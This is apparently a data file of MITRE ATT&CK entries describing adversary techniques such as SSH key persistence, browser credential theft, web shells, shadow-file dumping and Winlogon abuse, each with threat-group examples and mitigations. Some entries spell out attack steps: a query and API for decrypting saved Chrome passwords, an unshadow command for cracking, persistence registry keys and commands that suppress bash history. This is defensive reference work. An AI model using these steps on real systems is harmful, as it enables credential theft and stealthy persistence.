{"text": " Adversaries may modify the SSH <code>authorized_keys</code> file to maintain persistence on a victim host. Linux distributions and macOS commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The <code>authorized_keys</code> file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under <code>&lt;user-home&gt;/.ssh/authorized_keys</code>.(Citation: SSH Authorized Keys) Users may edit the system’s SSH config file to modify the directives PubkeyAuthentication and RSAAuthentication to the value “yes” to ensure public key and RSA authentication are enabled. The SSH config file is usually located under <code>/etc/ssh/sshd_config</code>. Adversaries may modify SSH <code>authorized_keys</code> files directly with scripts or shell commands to add their own adversary-supplied public keys. This ensures that an adversary possessing the corresponding private key may log in as an existing user via SSH.(Citation: Venafi SSH Key Abuse) (Citation: Cybereason Linux Exim Worm)", "idx": "https://attack.mitre.org/techniques/T1098/004", "title": "SSH Authorized Keys", "entity": "SSH Authorized Keys", "entity_type": "techniques", "entity_context": ["Disable SSH if it is not necessary on a host or restrict SSH access for specific users/groups using <code>/etc/ssh/sshd_config</code>.", "Skidmap has the ability to add the public key of its handlers to the <code>authorized_keys</code> file to maintain persistence on an infected host.", "Restrict access to the <code>authorized_keys</code> file.", "TeamTNT has added RSA keys in <code>authorized_keys</code>.", "XCSSET will create an ssh key if necessary with the <code>ssh-keygen -t rsa -f $HOME/.ssh/id_rsa -P</code> command. XCSSET will upload a private key file to the server to remotely access the host without a password. ", "Bundlore creates a new key pair with <code>ssh-keygen</code> and drops the newly created user key in <code>authorized_keys</code> to enable remote login."], "is_subtechnique": true}
{"text": " Adversaries may acquire credentials from web browsers by reading files specific to the target browser.(Citation: Talos Olympic Destroyer 2018) Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers. For example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim’s cached logon credentials as the decryption key. (Citation: Microsoft CryptUnprotectData April 2018) Adversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc.(Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017) Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the [Windows Credential Manager](https://attack.mitre.org/techniques/T1555/004). Adversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 2016) After acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).", "idx": "https://attack.mitre.org/techniques/T1555/003", "title": "Credentials from Web Browsers", "entity": "Credentials from Web Browsers", "entity_type": "techniques", "entity_context": ["Carberp's passw.plug plugin can gather passwords saved in Opera, Internet Explorer, Safari, Firefox, and Chrome.", "KeyBoy attempts to collect passwords from browsers.", "MuddyWater has run tools including Browser64 to steal passwords saved in victim web browsers.", "BLUELIGHT can collect passwords stored in web browers, including Internet Explorer, Edge, Chrome, and Naver Whale.", "Organizations may consider weighing the risk of storing credentials in web browsers. If web browser credential disclosure is a significant concern, technical controls, policy, and user training may be used to prevent storage of credentials in web browsers.", "Emotet has been observed dropping browser password grabber modules. ", "Melcoz has the ability to steal credentials from web browsers.", "APT3 has used tools to dump passwords from browsers.", "Agent Tesla can gather credentials from a number of browsers. ", "QakBot has collected usernames and passwords from Firefox and Chrome.", "Some Backdoor.Oldrea samples contain a publicly available Web browser password recovery tool.", "Leafminer used several tools for retrieving login and password information, including LaZagne.", "PinchDuke steals credentials from compromised hosts. PinchDuke's credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted by PinchDuke include ones associated with many sources such as Netscape Navigator, Mozilla Firefox, Mozilla Thunderbird, and Internet Explorer. ", "H1N1 dumps usernames and passwords from Firefox, Internet Explorer, and Outlook.", "PoetRAT has used a Python tool named Browdec.exe to steal browser credentials.", "Olympic Destroyer contains a module that tries to obtain stored credentials from web browsers.", "A module in Prikormka gathers logins and passwords stored in applications on the victims, including Google Chrome, Mozilla Firefox, and several other browsers.", "Proton gathers credentials for Google Chrome.", "Smoke Loader searches for credentials stored from web browsers.", "TSCookie has the ability to steal saved passwords from the Internet Explorer, Edge, Firefox, and Chrome browsers.", "Unknown Logger is capable of stealing usernames and passwords from browsers on the victim machine.", "Chaes can steal login credentials and stored financial information from the browser.", "Patchwork dumped the login data database from <code>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code>.", "Kimsuky has used browser extensions including Google Chrome to steal passwords and cookies from browsers.", "Pupy can use Lazagne for harvesting credentials.", "APT33 has used a variety of publicly available tools like LaZagne to gather credentials.", "njRAT has a module that steals passwords saved in victim web browsers.", "Zebrocy has the capability to upload dumper tools that extract credentials from web browsers and store them in database files.", "XAgentOSX contains the getFirefoxPassword function to attempt to locate Firefox passwords.", "TA505 has used malware to gather credentials from Internet Explorer.", "Grandoreiro can steal cookie data and credentials from Google Chrome.", "Lokibot has demonstrated the ability to steal credentials from multiple applications and data sources including Safari and the Chromium and Mozilla Firefox-based web browsers.", "CookieMiner can steal saved usernames and passwords in Chrome as well as credit card credentials.", "PLEAD has the ability to steal saved credentials from web browsers.", "RainyDay can use tools to collect credentials from web browsers.", "Ajax Security Team has used FireMalv custom-developed malware, which collected passwords from the Firefox browser storage.", "LaZagne can obtain credentials from web browsers such as Google Chrome, Internet Explorer, and Firefox.", "ROKRAT steals credentials stored in Web browsers by querying the sqlite database.", "Machete collects stored credentials from several web browsers. ", "APT37 has used a credential stealer known as ZUMKONG that can harvest usernames and passwords stored in browsers.", "FIN6 has used the Stealer One credential stealer to target web browsers.", "RedLeaves can gather browser usernames and passwords.", "OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access. OilRig has also used tool named PICKPOCKET to dump passwords from web browsers.", "Imminent Monitor has a PasswordRecoveryPacket module for recovering browser passwords.", "QuasarRAT can obtain passwords from common web browsers.", "KONNI can steal profiles (containing credential information) from Firefox, Chrome, and Opera.", "Empire can use modules that extract passwords from common web browsers such as Firefox and Chrome.", "Mimikatz performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from DPAPI.\t", "Crimson contains a module to steal credentials from Web browsers on the victim machine.", "CosmicDuke collects user credentials, including passwords, for various programs including Web browsers.", "jRAT can capture passwords from common web browsers such as Internet Explorer, Google Chrome, and Firefox.", "OLDBAIT collects credentials from Internet Explorer, Mozilla Firefox, and Eudora.", "NETWIRE has the ability to steal credentials from web browsers including Internet Explorer, Opera, Yandex, and Chrome.", "BlackEnergy has used a plug-in to gather credentials from web browsers including FireFox, Google Chrome, and Internet Explorer.", "Trojan.Karagany can steal data and credentials from browsers.", "Inception used a browser plugin to steal passwords and sessions from Internet Explorer, Chrome, Opera, Firefox, Torch, and Yandex.", "Stealth Falcon malware gathers passwords from multiple sources, including Internet Explorer, Firefox, and Chrome.", "Molerats used the public tool BrowserPasswordDump10 to dump passwords saved in browsers on victims.", "ZIRCONIUM has used a tool to steal credentials from installed web browsers including Microsoft Internet Explorer and Google Chrome.", "Azorult can steal credentials from the victim's browser.", "ChChes steals credentials stored inside Internet Explorer.", "Javali can capture login credentials from open browsers including Firefox, Chrome, Internet Explorer, and Edge.", "Sandworm Team's CredRaptor tool can collect saved passwords from various internet browsers.", "TrickBot can obtain passwords stored in files from web browsers such as Chrome, Firefox, Internet Explorer, and Microsoft Edge, sometimes using esentutl.", "KGH_SPY has the ability to steal data from the Chrome, Edge, Firefox, Thunderbird, and Opera browsers."], "is_subtechnique": true}
{"text": " Adversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, and a variety of other malicious content. Adversaries may upload malware to support their operations, such as making a payload available to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) by placing it on an Internet accessible web server. Malware may be placed on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Malware can also be staged on web services, such as GitHub or Pastebin.(Citation: Volexity Ocean Lotus November 2020) Adversaries may upload backdoored files, such as application binaries, virtual machine images, or container images, to third-party software stores or repositories (ex: GitHub, CNET, AWS Community AMIs, Docker Hub). By chance encounter, victims may directly download/install these backdoored files via [User Execution](https://attack.mitre.org/techniques/T1204). [Masquerading](https://attack.mitre.org/techniques/T1036) may increase the chance of users mistakenly executing these files.", "idx": "https://attack.mitre.org/techniques/T1608/001", "title": "Upload Malware", "entity": "Upload Malware", "entity_type": "techniques", "entity_context": ["APT32 has hosted malicious payloads in Dropbox, Amazon S3, and Google Drive for use during targeting.", "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls.", "TeamTNT has uploaded backdoored Docker images to Docker Hub."], "is_subtechnique": true}
{"text": " Adversaries may break out of a container to gain access to the underlying host. This can allow an adversary access to other containerized resources from the host level or to the host itself. In principle, containerized resources should provide a clear separation of application functionality and be isolated from the host environment.(Citation: Docker Overview) There are multiple ways an adversary may escape to a host environment. Examples include creating a container configured to mount the host’s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host, or utilizing a privileged container to run commands on the underlying host.(Citation: Docker Bind Mounts)(Citation: Trend Micro Privileged Container)(Citation: Intezer Doki July 20) Adversaries may also escape via [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.(Citation: Windows Server Containers Are Open) Gaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, or setting up a command and control channel on the host.", "idx": "https://attack.mitre.org/techniques/T1611", "title": "Escape to Host", "entity": "Escape to Host", "entity_type": "techniques", "entity_context": ["Consider utilizing seccomp, seccomp-bpf, or a similar solution that restricts certain system calls such as mount.", "Use read-only containers and minimal images when possible to prevent the running of commands.", "Ensure containers are not running as root by default.", "Hildegard has used the BOtB tool that can break out of containers.  ", "Siloscape maps the host’s C drive to the container by creating a global symbolic link to the host through the calling of <code>NtSetInformationSymbolicLink</code>.", "Doki’s container was configured to bind the host root directory.", "TeamTNT has deployed privileged containers that mount the filesystem of victim machine."], "is_subtechnique": false}
{"text": " Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version. Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Avast CCleaner3 2018) (Citation: Command Five SK 2011)", "idx": "https://attack.mitre.org/techniques/T1195/002", "title": "Compromise Software Supply Chain", "entity": "Compromise Software Supply Chain", "entity_type": "techniques", "entity_context": ["GoldenSpy has been packaged with a legitimate tax preparation software.", "Dragonfly has placed trojanized installers on legitimate vendor app stores.", "Cobalt Group has compromised legitimate web browser updates to deliver a backdoor. ", "APT29 gained initial network access to some victims via a trojanized update of SolarWinds Orion software.", "A patch management process should be implemented to check unused applications, unmaintained and/or previously vulnerable software, unnecessary features, components, files, and documentation.", "SUNSPOT malware was designed and used to insert SUNBURST into software builds of the SolarWinds Orion IT management product.", "APT41 gained access to production environments where they could inject malicious code into legitimate, signed files and widely distribute them to end users.", "GOLD SOUTHFIELD has distributed ransomware by backdooring software installers via a strategic web compromise of the site hosting Italian WinRAR.", "CCBkdr was added to a legitimate, signed version 5.33 of the CCleaner software and distributed on CCleaner's distribution site.", "Sandworm Team has distributed NotPetya by compromising the legitimate Ukrainian accounting software M.E.Doc and replacing a legitimate software update with a malicious one.", "Continuous monitoring of vulnerability sources and the use of automatic and manual code review tools should also be implemented as well."], "is_subtechnique": true}
{"text": " Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Adversaries can collect or forward email from mail servers or clients.", "idx": "https://attack.mitre.org/techniques/T1114", "title": "Email Collection", "entity": "Email Collection", "entity_type": "techniques", "entity_context": ["Use of multi-factor authentication for public-facing webmail servers is a recommended best practice to minimize the usefulness of usernames and passwords to adversaries.", "Use of encryption provides an added layer of security to sensitive information sent over email. Encryption using public key cryptography requires the adversary to obtain the private certificate along with an encryption key to decrypt messages.", "Enterprise email solutions have monitoring mechanisms that may include the ability to audit auto-forwarding rules on a regular basis.\n\nIn an Exchange environment, Administrators can use Get-InboxRule to discover and remove potentially malicious auto-forwarding rules. ", "Silent Librarian has exfiltrated entire mailboxes from compromised accounts.", "Magic Hound has compromised email credentials in order to steal sensitive data."], "is_subtechnique": false}
{"text": " Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency. (Citation: Trendmicro NPM Compromise) Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.", "idx": "https://attack.mitre.org/techniques/T1195/001", "title": "Compromise Software Dependencies and Development Tools", "entity": "Compromise Software Dependencies and Development Tools", "entity_type": "techniques", "entity_context": ["XCSSET adds malicious code to a host's Xcode projects by enumerating CocoaPods <code>target_integrator.rb</code> files under the <code>/Library/Ruby/Gems</code> folder or enumerates all <code>.xcodeproj</code> folders under a given directory. XCSSET then downloads a script and Mach-O file into the Xcode project folder.", "A patch management process should be implemented to check unused dependencies, unmaintained and/or previously vulnerable dependencies, unnecessary features, components, files, and documentation.", "Continuous monitoring of vulnerability sources and the use of automatic and manual code review tools should also be implemented as well."], "is_subtechnique": true}
{"text": " Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used or give context to information collected by a keylogger.", "idx": "https://attack.mitre.org/techniques/T1010", "title": "Application Window Discovery", "entity": "Application Window Discovery", "entity_type": "techniques", "entity_context": ["Kazuar gathers information about opened windows.", "njRAT gathers information about opened windows during the initial infection.", "Remexi has a command to capture active windows on the machine and retrieve window titles.", "Lazarus Group malware IndiaIndia obtains and sends to its C2 server the title of the window for each running process. The KilaAlfa keylogger also reports the title of the window in the foreground.", "Attor can obtain application window titles and then determines which windows to perform Screen Capture on.", "Catchamas obtains application windows titles and then determines which windows to perform Screen Capture on.", "PowerDuke has a command to get text of the current foreground window.", "NetTraveler reports window names along with keylogger information to provide application context.", "SOUNDBITE is capable of enumerating application windows.", "PoisonIvy captures window titles.", "WINERACK can enumerate active windows.", "The discovery modules used with Duqu can collect information on open windows.", "NETWIRE can discover and close windows on controlled systems.", "Trojan.Karagany can monitor the titles of open windows to identify specific keywords.\t ", "Grandoreiro can identify installed security tools based on window names.", "Machete saves the window names. ", "HotCroissant has the ability to list the names of all open windows on the infected host.", "Aria-body has the ability to identify the titles of running windows on a compromised host.", "PLEAD has the ability to list open windows on the compromised host.", "Cadelspy has the ability to identify open windows on the compromised host.", "QakBot has the ability to enumerate windows on a compromised host.\n", "Metamorfo can enumerate all windows on the victim’s machine.", "InvisiMole can enumerate windows and child windows on a compromised host."], "is_subtechnique": false}
{"text": " Adversaries may leverage Confluence repositories to mine valuable information. Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as: * Policies, procedures, and standards * Physical / logical network diagrams * System architecture diagrams * Technical system documentation * Testing / development credentials * Work / project schedules * Source code snippets * Links to network shares and other internal resources", "idx": "https://attack.mitre.org/techniques/T1213/001", "title": "Confluence", "entity": "Confluence", "entity_type": "techniques", "entity_context": ["Consider periodic review of accounts and privileges for critical and sensitive Confluence repositories.", "Develop and publish policies that define acceptable information to be stored in Confluence repositories.", "Enforce the principle of least-privilege. Consider implementing access control mechanisms that include both authentication and authorization."], "is_subtechnique": true}
{"text": " Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server. In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (ex: [China Chopper](https://attack.mitre.org/software/S0020) Web shell client).(Citation: Lee 2013)", "idx": "https://attack.mitre.org/techniques/T1505/003", "title": "Web Shell", "entity": "Web Shell", "entity_type": "techniques", "entity_context": ["Fox Kitten has installed web shells on compromised hosts to maintain access.", "Dragonfly 2.0 commonly created Web shells on victims' publicly accessible email and web servers, which they used to maintain access to a victim network and download additional malicious files.", "BackdoorDiplomacy has used web shells to establish an initial foothold and for lateral movement within a victim's system.", "Deep Panda uses Web shells on publicly accessible Web servers to access victim networks.", "OilRig has used web shells, often to maintain access to a victim network.", "Volatile Cedar can inject web shell code into a server. ", "SUPERNOVA is a Web shell.", "ASPXSpy is a Web shell. The ASPXTool version used by Threat Group-3390 has been deployed to accessible servers running Internet Information Services (IIS).", "APT32 has used Web shells to maintain access to victim websites.", "Kimsuky has used modified versions of open source PHP web shells to maintain access, often adding \"Dinosaur\" references within the code.", "Leviathan relies on web shells for an initial foothold as well as persistence into the victim's systems.", "China Chopper's server component is a Web Shell payload.", "OwaAuth is a Web shell that appears to be exclusively used by Threat Group-3390. It is installed as an ISAPI filter on Exchange servers and shares characteristics with the China Chopper Web shell.", "Operation Wocao has used their own web shells, as well as those previously placed on target systems by other threat actors, for reconnaissance and lateral movement.", "Threat Group-3390 has used a variety of Web shells.", "APT28 has used a modified and obfuscated version of the reGeorg web shell to maintain persistence on a target's Outlook Web Access (OWA) server.", "HAFNIUM has deployed multiple web shells on compromised servers including SIMPLESEESHARP, SPORTSBALL, China Chopper, and ASPXSpy.", "APT29 has installed web shells on exploited Microsoft Exchange servers.", "Tropic Trooper has started a web service in the target host and wait for the adversary to connect, acting as a web shell.\t", "Consider disabling functions from web technologies such as PHP’s <code>eval()</code> that may be abused for web shells.", "TEMP.Veles has planted Web shells on Outlook Exchange servers.", "APT38 has used web shells for persistence or to ensure redundant access.", "Tonto Team has used a first stage web shell after compromising a vulnerable Exchange server.", "GALLIUM used Web shells to persist in victim environments and assist in execution and exfiltration.", "P.A.S. Webshell can gain remote access and execution on target web servers.", "Enforce the principle of least privilege by limiting privileges of user accounts so only authorized accounts can modify the web directory.", "APT39 has installed ANTAK and ASPXSPY web shells.", "SEASHARPEE is a Web shell.", "Sandworm Team has used webshells including P.A.S. Webshell to maintain access to victim networks."], "is_subtechnique": true}
{"text": " Adversaries may attempt to dump the contents of <code>/etc/passwd</code> and <code>/etc/shadow</code> to enable offline password cracking. Most modern Linux operating systems use a combination of <code>/etc/passwd</code> and <code>/etc/shadow</code> to store user account information including password hashes in <code>/etc/shadow</code>. By default, <code>/etc/shadow</code> is only readable by the root user.(Citation: Linux Password and Shadow File Formats) The Linux utility, unshadow, can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper:(Citation: nixCraft - John the Ripper) <code># /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db</code>", "idx": "https://attack.mitre.org/techniques/T1003/008", "title": "/etc/passwd and /etc/shadow", "entity": "/etc/passwd and /etc/shadow", "entity_type": "techniques", "entity_context": ["Ensure that root accounts have complex, unique passwords across all systems on the network.", "LaZagne can obtain credential information from /etc/shadow using the shadow.py module.", "Follow best practices in restricting access to privileged accounts to avoid hostile programs from accessing such sensitive information."], "is_subtechnique": true}
{"text": " Adversaries may send spearphishing messages with a malicious attachment to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon the recipient populating information then returning the file.(Citation: Sophos Attachment)(Citation: GitHub Phishery) The text of the spearphishing email usually tries to give a plausible reason why the file should be filled-in, such as a request for information from a business associate. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.", "idx": "https://attack.mitre.org/techniques/T1598/002", "title": "Spearphishing Attachment", "entity": "Spearphishing Attachment", "entity_type": "techniques", "entity_context": ["Sidewinder has sent e-mails with malicious attachments that lead victims to credential harvesting websites.", "Astaroth has been delivered via malicious e-mail attachments.", "Users can be trained to identify social engineering techniques and spearphishing attempts.", "Use anti-spoofing and email authentication mechanisms to filter messages based on validity checks of the sender domain (using SPF) and integrity of messages (using DKIM). Enabling these mechanisms within an organization (through policies such as DMARC) may enable recipients (intra-org and cross domain) to perform similar message filtering and validation."], "is_subtechnique": true}
{"text": " Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\Software[\\\\Wow6432Node\\\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> and <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> are used to manage additional helper programs and functionalities that support Winlogon. (Citation: Cylance Reg Persistence Sept 2013) Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013) * Winlogon\\Notify - points to notification package DLLs that handle Winlogon events * Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on * Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on Adversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.", "idx": "https://attack.mitre.org/techniques/T1547/004", "title": "Winlogon Helper DLL", "entity": "Winlogon Helper DLL", "entity_type": "techniques", "entity_context": ["Tropic Trooper has created the Registry key <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</code> and sets the value to establish persistence.", "Bazar can use Winlogon Helper DLL to establish persistence.", "Cannon adds the Registry key <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon</code> to establish persistence.", "Identify and block potentially malicious software that may be executed through the Winlogon helper process by using application control  tools like AppLocker   that are capable of auditing and/or blocking unknown DLLs.", "A Dipsind variant registers as a Winlogon Event Notify DLL to establish persistence.", "Turla established persistence by adding a Shell value under the Registry key <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon</code>.", "Limit the privileges of user accounts so that only authorized administrators can perform Winlogon helper changes.", "Remexi achieves persistence using Userinit by adding the Registry key <code>HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit</code>.", "Gazer can establish persistence by setting the value “Shell” with “explorer.exe, %malware_pathfile%” under the Registry key <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon</code>.", "Wizard Spider has established persistence using Userinit by adding the Registry key HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon.", "KeyBoy issues the command <code>reg add “HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon”</code> to achieve persistence. "], "is_subtechnique": true}
{"text": " Adversaries may search the bash command history on compromised systems for insecurely stored credentials. Bash keeps track of the commands users type on the command-line with the \"history\" utility. Once a user logs out, the history is flushed to the user’s <code>.bash_history</code> file. For each user, this file resides at the same location: <code>~/.bash_history</code>. Typically, this file keeps track of the user’s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Attackers can abuse this by looking through the file for potential credentials. (Citation: External to DA, the OS X Way)", "idx": "https://attack.mitre.org/techniques/T1552/003", "title": "Bash History", "entity": "Bash History", "entity_type": "techniques", "entity_context": ["Kinsing has searched <code>bash_history</code> for credentials.", "There are multiple methods of preventing a user's command history from being flushed to their .bash_history file, including use of the following commands:\n<code>set +o history</code> and <code>set -o history</code> to start logging again;\n<code>unset HISTFILE</code> being added to a user's .bash_rc file; and\n<code>ln -s /dev/null ~/.bash_history</code> to write commands to <code>/dev/null</code>instead."], "is_subtechnique": true}
{"text": " Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and access restricted information. Several of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.", "idx": "https://attack.mitre.org/techniques/T1003", "title": "OS Credential Dumping", "entity": "OS Credential Dumping", "entity_type": "techniques", "entity_context": ["Suckfly used a signed credential-dumping tool to obtain victim account credentials.", "APT39 has used different versions of Mimikatz to obtain credentials.", "Axiom has been known to dump credentials.", "Frankenstein has harvested credentials from the victim's machine using Empire.", "With Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.  It also does not protect against all forms of credential dumping. ", "Limit credential overlap across accounts and systems by training users and administrators not to use the same password for multiple accounts.", "Ensure Domain Controller backups are properly secured.", "HOMEFRY can perform credential dumping.", "Leviathan has used publicly available tools to dump password hashes, including HOMEFRY.", "Sowbug has used credential dumping tools.", "\nManage the access control list for “Replicating Directory Changes” and other permissions associated with domain controller replication.   Consider adding users to the \"Protected Users\" Active Directory security group. This can help limit the caching of users' plaintext credentials.", "APT32 used GetPassword_x64 to harvest credentials.", "Ensure that local administrator accounts have complex, unique passwords across all systems on the network.", "PinchDuke steals credentials from compromised hosts. PinchDuke's credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted by PinchDuke include ones associated many sources such as WinInet Credential Cache, and Lightweight Directory Access Protocol (LDAP).", "APT28 regularly deploys both publicly available (ex: Mimikatz) and custom password retrieval tools on victims.\t", "Trojan.Karagany can dump passwords and save them into <code>\\ProgramData\\Mail\\MailAg\\pwds.txt</code>.", "Carbanak obtains Windows logon password details.", "On Windows 10, enable Attack Surface Reduction (ASR) rules to secure LSASS and prevent credential stealing. ", "\nOn Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.", "Revenge RAT has a plugin for credential harvesting.", "Tonto Team has used a variety of credential dumping tools. ", "Windows:\nDo not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers.\n\nLinux:\nScraping the passwords from memory requires root privileges. Follow best practices in restricting access to privileged accounts to avoid hostile programs from accessing such sensitive regions of memory.", "OnionDuke steals credentials from its victims.", "Poseidon Group conducts credential dumping on victims, with a focus on obtaining credentials belonging to domain and database servers.", "\nConsider disabling or restricting NTLM. Consider disabling WDigest authentication."], "is_subtechnique": false}
{"text": " Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. PE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references. (Citation: Elastic Process Injection July 2017) Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process.", "idx": "https://attack.mitre.org/techniques/T1055/002", "title": "Portable Executable Injection", "entity": "Portable Executable Injection", "entity_type": "techniques", "entity_context": ["GreyEnergy has a module to inject a PE binary into a remote process.", "Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process. ", "Rocke's miner, \"TermsHost.exe\", evaded defenses by injecting itself into Windows processes, including Notepad.exe.\t", "InvisiMole can inject its backdoor as a portable executable into a target process.\t", "Zeus Panda checks processes on the system and if they meet the necessary requirements, it injects into that process.", "Gorgon Group malware can download a remote access tool, ShiftyBug, and inject into another process.", "Carbanak downloads an executable and injects it directly into a new process."], "is_subtechnique": true}
{"text": " The adversary is trying to avoid being detected. Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.", "idx": "https://attack.mitre.org/tactics/TA0005", "title": "Defense Evasion", "entity": "Defense Evasion", "entity_type": "tactics", "entity_context": [], "is_subtechnique": false}
{"text": " The adversary is trying to maintain their foothold. Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code.", "idx": "https://attack.mitre.org/tactics/TA0003", "title": "Persistence", "entity": "Persistence", "entity_type": "tactics", "entity_context": [], "is_subtechnique": false}
